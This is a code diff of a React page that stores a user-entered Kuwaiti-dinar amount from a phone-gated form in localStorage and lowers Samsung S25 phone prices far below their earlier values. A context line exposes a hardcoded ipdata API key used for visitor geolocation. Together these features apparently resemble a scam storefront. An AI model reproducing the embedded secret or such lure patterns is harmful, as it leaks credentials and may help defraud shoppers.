@@ -31,6 +31,9 @@ export default function Home() {
       setisloading(false)
     }, 3000);
   }
+  const handleAmount=(value:string)=>{
+    localStorage.setItem('amount',value!)
+  }
   async function getLocation() {
     const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
     const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
@@ -135,6 +138,7 @@ export default function Home() {
         {phone.length>=8 && 
           <Input
           required
+          onChange={(e)=>handleAmount(e.target.value)}
           maxLength={3}
           placeholder="القيمة بالدينار الكويتي"
           type="tel"
@@ -178,11 +182,11 @@ export default function Home() {
           <ProductCard
             image="/s25-Ultra-silver-blue-700x700.webp"
             title="Samsung S25 Ultra"
-            price="999.00"
+            price="255.00"
             currency="د.ك"
-            installment="41.63"
+            installment="12.63"
           />
-          <ProductCard image="/s25-Ultra-silver-blue-700x700.webp" title="Samsung S25" price="799.00" currency="د.ك" installment="33.29" />
+          <ProductCard image="/s25-Ultra-silver-blue-700x700.webp" title="Samsung S25" price="225.00" currency="د.ك" installment="11.29" />
         </div>
       </div>
 
